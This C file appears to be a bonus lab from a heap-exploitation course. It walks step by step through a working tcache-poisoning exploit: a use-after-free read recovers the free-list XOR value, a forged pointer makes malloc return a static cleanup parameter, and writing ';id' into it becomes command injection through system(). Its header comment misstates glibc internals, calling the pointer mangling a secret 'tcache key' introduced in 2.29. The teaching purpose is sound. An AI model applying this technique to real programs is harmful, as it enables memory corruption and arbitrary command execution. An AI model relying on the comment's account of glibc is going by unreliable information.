/*
 * 04_bonus_glibc_tcache.c — the same exploit, but against real glibc
 *
 * Same story as the desks: the program keeps a cleanup parameter and
 * passes it to the shell: system("echo " + parameter). Your job is to
 * write ";id" into it through a UAF, then let the program run it.
 *
 * Your own desk (03_uaf_game.c) stores the free-list pointer in plain
 * sight, so you can read and type it. Real glibc (2.29+) is tougher:
 * it XORs every free-list pointer with a secret key (the "tcache key").
 *
 * Why XOR? a freed chunk's first bytes hold the "next" pointer. glibc
 * does not want an attacker to overwrite them with a raw address, so it
 * stores (next ^ key) instead. Now a naive overwrite of the
 * parameter's address makes malloc return (param ^ key), not the param.
 *
 * The trick: recover the key through the UAF itself.
 *
 *   1. free(A).            A is the only entry, so its corner = NULL^key = key.
 *   2. read A's corner.    -> we now know key.                  (UAF read)
 *   3. free(B).            B becomes the head, corner = A ^ key.
 *   4. overwrite B's corner with (param ^ key).                 (UAF write)
 *   5. malloc.             pops B (we get B back), new head = corner^key = param.
 *   6. malloc.             pops the PARAMETER and returns it!
 *   7. write ";id" there, run the cleanup: the shell runs `id`.
 *
 * Build:  gcc -g -O0 -no-pie -o tcache 04_bonus_glibc_tcache.c
 * (needs 64-bit glibc with tcache — the default on most Linux systems)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* pinned to a fixed address by the linker (see Makefile): parameter at
 * 0x4a0000, so its address is the same on every build. The glibc heap
 * chunks (a, b, ...) still move every run — that is real malloc, and the
 * UAF-recovered key is what makes the exploit work anyway. */
__attribute__((section(".uaf_param")))
static char cleanup_param[32] = "all_ok";

int main(void)
{
    printf("cleanup parameter before: %s (at %p)\n", cleanup_param, (void *)cleanup_param);

    char *a = malloc(16);
    char *b = malloc(16);

    /* steps 1+2: free A alone so its corner holds NULL^key = key,
     * then read it through the dangling pointer (UAF read). */
    free(a);
    unsigned long key = *(unsigned long *)a;
    printf("tcache key (recovered via UAF read): 0x%lx\n", key);

    /* steps 3+4: free B (it becomes the head).
     * overwrite B's corner with (param ^ key) — the UAF write. */
    free(b);
    *(unsigned long *)b = (unsigned long)cleanup_param ^ key;

    /* steps 5+6: the first malloc pops B (harmless), the second pops
     * the value B's corner pointed to after un-XORing: the parameter. */
    char *first = malloc(16);
    char *victim = malloc(16);
    printf("malloc returned: %p, then %p\n", (void *)first, (void *)victim);

    /* step 7: arbitrary write -> command injection.
     * the program now uses the parameter the way it always does: */
    strcpy(victim, ";id");
    printf("cleanup parameter after:  %s\n", cleanup_param);
    char cmd[64];
    snprintf(cmd, sizeof cmd, "echo %s", cleanup_param);
    system(cmd);
    puts("(the shell ran `echo` and then `id` — command injection via the UAF)");
    return 0;
}
